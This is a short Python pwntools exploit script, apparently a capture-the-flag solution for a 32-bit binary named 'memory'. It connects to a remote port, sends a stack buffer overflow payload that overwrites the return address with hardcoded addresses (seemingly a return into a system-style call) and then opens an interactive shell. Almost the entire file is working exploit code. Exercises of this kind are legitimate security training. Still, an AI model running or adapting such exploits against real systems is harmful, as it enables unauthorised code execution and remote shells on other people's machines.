from pwn import *
from LibcSearcher import *
from utils import log,show_ida_patch
from loader import Loader
from pwnlib.util.proc import wait_for_debugger

loader = Loader("target/memory", 32)
loader.debug()


@log
def ru(x): return io.recvuntil(x)
@log
def rl(): return io.recvline()
@log
def sla(x, y): return io.sendlineafter(x, y)
@log
def sl(x): return io.sendline(x)
@log
def s(x): return io.send(x)
@log
def sa(x, y): return io.sendafter(x, y)
def psize(x): return loader.psize(x)
def shell(): io.interactive()
def bt(s): return bytes(str(s),encoding='utf-8')
# io = process(loader.root,stdin=PTY)
# wait_for_debugger(io.pid)


# io = process(pwnfile)
# io = loader.process()
io = loader.remote(29869)
elf = loader.elf


def main():
    payload = b'a'*0x13+b'bbbb'+p32(0x80485C9)+p32(0x80487e0)
    # loader.show_ida_patch_code(payload, 0xFFA7C335)
    sl(payload)
    shell()


if __name__ == "__main__":
    main()